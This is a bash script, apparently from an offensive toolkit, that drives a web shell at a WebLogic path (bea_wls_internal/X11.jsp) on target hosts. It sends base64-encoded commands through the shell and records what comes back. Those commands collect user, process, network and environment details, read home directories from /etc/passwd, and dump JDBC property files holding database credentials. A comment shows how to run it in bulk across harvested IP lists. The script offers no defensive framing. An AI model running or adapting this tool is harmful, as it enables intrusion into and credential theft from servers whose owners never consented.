#!/usr/bin/env bash
# cat data/Ok.txt |sed 's/\?.*//g'|sort -u|grep '192'|xargs -I K getIpInfo "c" "x" K
curIp="$1"
jspNm="X11.jsp"

curDir="/myhktools"
mkdir ${curDir}/ip 2>/dev/null
if [ "$2" != "" ];
then
   jspNm="$2"
fi
urlCurl="http://${curIp}/bea_wls_internal/${jspNm}"
if [ "$3" != "" ];
then
   urlCurl="$3"
   curIp=`echo $3|grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,}'`
fi
curIp1=`echo $curIp|sed 's/:.*$//g'`

kkT="echo !!;echo =========================;"
cmdT1='whoami;${kkT}pwd;${kkT}set;${kkT}netstat -ant;${kkT}ps -ef;${kkT}cat /etc/passwd|grep "/bash"|cut -d: -f6;${kkT}find . -type f -name "*jdbc*.properties"|xargs -I {} cat {} |grep -Ev "^#|^\s*$;${kkT}"'
# echo -e "whoami\npwd\nset\nnetstat -ant\nps -ef\ncat /etc/passwd|grep \"/bash\"|cut -d: -f6"|xargs -I % bash -c 'echo -e "===============\n%\n===============\n" >>'$curDir'/ip/'$curIp1'.txt;curl "'$urlCurl'?ls=%" -s -o- |sed -E "s/<.*>//g"|grep -Ev "^$"|iconv -f GBK -t UTF-8 >> '$curDir'/ip/'$curIp1'.txt'
echo -e $cmdT1|base64|tr -d "\n"|xargs -I % bash -c 'curl "'$urlCurl'?ls=echo %|base64 -d|sh" -s -o- |sed -E "s/<.*>//g"|grep -Ev "^$"|iconv -f GBK -t UTF-8 >> '$curDir'/ip/'$curIp1'.txt'

